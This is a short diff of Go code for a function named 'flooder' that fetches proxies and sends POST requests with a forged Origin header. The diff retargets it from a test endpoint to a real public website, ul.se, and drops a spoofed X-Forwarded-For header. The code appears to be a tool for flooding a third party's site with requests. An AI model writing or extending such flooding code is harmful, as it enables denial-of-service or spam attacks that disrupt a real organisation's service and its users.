@@ -52,7 +52,7 @@ func fetchProxyList() []string {
 }
 
 func flooder() {
-	url := "https://wew.requestcatcher.com/" // Replace with your API endpoint
+	url := "https://www.ul.se/" // Replace with your API endpoint
 	uid, err := uuid.NewUUID()
 	if err != nil {
 		fmt.Printf("Error generating UUID: %s\n", err)
@@ -72,7 +72,6 @@ func flooder() {
 	req.Header.SetMethod("POST")
 	req.Header.Set("Origin", "https://www.ul.se")
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	req.Header.Set("X-Forwarded-For", proxy) // Use the selected proxy as X-Forwarded-For
 	req.SetRequestURI(url)
 	req.SetBodyString(data)
 
